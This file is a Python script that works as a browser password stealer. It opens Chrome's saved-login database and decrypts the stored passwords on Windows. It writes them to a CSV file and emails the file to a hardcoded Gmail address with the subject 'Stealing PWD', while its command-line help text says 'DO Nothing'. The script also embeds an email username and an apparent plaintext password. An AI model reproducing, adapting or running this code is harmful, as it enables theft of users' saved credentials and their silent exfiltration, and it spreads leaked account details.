#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import sqlite3
import csv
import json
import argparse

import smtplib
import mimetypes

from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.text import MIMEText

emailfrom = "pathakrohit8190@gmail.com"
emailto = "pathakrohit08@gmail.com"
fileToSend = ".\chromepass.csv"
username = "pathakrohit8190"
password = "rohit8190"

try:
    import win32crypt
except:
    pass



def args_parser():

    parser = argparse.ArgumentParser(
        description="DO Nothing")
    parser.add_argument("-o", "--output", choices=['csv', 'json'],
                        help="Output  to [ CSV | JSON ] format.")
    parser.add_argument(
        "-d", "--dump", help="Dump  to stdout. ", action="store_true")

    args = parser.parse_args()
    if args.dump:
        for data in main():
            print(data)
    if args.output == 'csv':
        output_csv(main())
        return

    if args.output == 'json':
        output_json(main())
        return

    else:
        parser.print_help()

def send_mail():
    msg = MIMEMultipart()
    msg["From"] = emailfrom
    msg["To"] = emailto
    msg["Subject"] = "Stealing PWD"
    

    ctype, encoding = mimetypes.guess_type(fileToSend)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"

    maintype, subtype = ctype.split("/", 1)

    if maintype == "text":
        fp = open(fileToSend)
        # Note: we should handle calculating the charset
        attachment = MIMEText(fp.read(), _subtype=subtype)
        fp.close()
    elif maintype == "image":
        fp = open(fileToSend, "rb")
        attachment = MIMEImage(fp.read(), _subtype=subtype)
        fp.close()
    elif maintype == "audio":
        fp = open(fileToSend, "rb")
        attachment = MIMEAudio(fp.read(), _subtype=subtype)
        fp.close()
    else:
        fp = open(fileToSend, "rb")
        attachment = MIMEBase(maintype, subtype)
        attachment.set_payload(fp.read())
        fp.close()
        encoders.encode_base64(attachment)
    attachment.add_header("Content-Disposition", "attachment", filename=fileToSend)
    msg.attach(attachment)

    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login(username, password)
    server.sendmail(emailfrom, emailto, msg.as_string())
    server.quit()

def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            print("Mac OSX not supported.")
            sys.exit(0)

        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })

            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
            sys.exit(0)
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
            sys.exit(0)
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
            sys.exit(0)
        else:
            print(e)
            sys.exit(0)

    return info_list


def getpath():
    if os.name == "nt":
        # This is the Windows Path
        PathName = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
    elif ((os.name == "posix") and (sys.platform == "darwin")):
        # This is the OS X Path
        PathName = os.getenv(
            'HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
    elif (os.name == "posix"):
        # This is the Linux Path
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)

    return PathName


def output_csv(info):
    try:
        with open('C:\CIMIC\chromepass.csv', 'wb') as csv_file:
            csv_file.write('origin_url,username,p \n'.encode('utf-8'))
            for data in info:
                csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data[
                    'username'], data['password'])).encode('utf-8'))
        print("Data written to chromepass.csv")
        send_mail()
    except EnvironmentError:
        print('EnvironmentError: cannot write data')


def output_json(info):
	try:
		with open('chromepass.json', 'w') as json_file:
			json.dump({'pass':info},json_file)
			print("Data written to chromepass.json")
	except EnvironmentError:
		print('EnvironmentError: cannot write data')



if __name__ == '__main__':
    args_parser()